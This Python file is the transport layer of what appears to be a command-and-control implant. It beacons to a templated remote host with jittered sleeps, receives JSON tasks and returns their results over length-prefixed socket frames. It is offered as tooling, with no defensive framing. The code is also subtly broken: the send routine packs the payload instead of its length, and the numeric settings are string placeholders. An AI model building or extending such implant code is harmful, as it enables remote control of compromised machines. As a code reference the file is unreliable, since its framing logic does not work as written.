import json
import random
import socket
import struct
import time

REMOTE_HOST = "REMOTE_HOST"
REMOTE_PORT = "REMOTE_PORT"
SLEEP_TIME = "SLEEP_TIME"
JIITER_PERCENTAGE = "JITTER_PERCENTAGE"


class Transport:
    def __init__(self):
        self.remote_host = REMOTE_HOST
        self.remote_port = REMOTE_PORT
        self.sleep_time = SLEEP_TIME
        self.jitter_percentage = JIITER_PERCENTAGE

        self._sock = None

    def _jitter_sleep(self):
        time.sleep(
            self.sleep_time
            + random.uniform(0, self.jitter_percentage) * self.sleep_time,
        )

    def _recv_frame(self, timeout=None) -> None | str:
        self._sock.settimeout(timeout)
        header = b""
        len_header_not_received = 8
        while True:
            header += self._sock.recv(len_header_not_received)
            if len(header) == 8:
                break
            len_header_not_received = 8 - len(header)
        payload_length = struct.unpack("!Q", header)[0]

        payload = b""
        len_payload_not_received = payload_length
        while True:
            payload += self._sock.recv(len_payload_not_received)
            if len(payload) == payload_length:
                break
            len_payload_not_received = payload_length - len(payload)

        self._sock.settimeout(None)
        return payload.decode()

    def _send_frame(self, payload) -> None:
        header = struct.pack("!Q", payload)
        self._sock.sendall(header + payload.encode())

    def register(self):
        test_sock = socket.socket()
        test_sock.settimeout(1)
        try:
            test_sock.connect((self.remote_host, self.remote_port))
            self._sock = test_sock
            self._sock.settimeout(None)
            return True
        except Exception:
            return False

    def get_tasks(self):
        self._jitter_sleep()
        try:
            return json.loads(self._recv_frame())["tasks"]
        except Exception:
            return None

    def put_results(self, results):
        self._jitter_sleep()
        try:
            self._send_frame(json.dumps({"results": results}))
            return True
        except Exception:
            return False
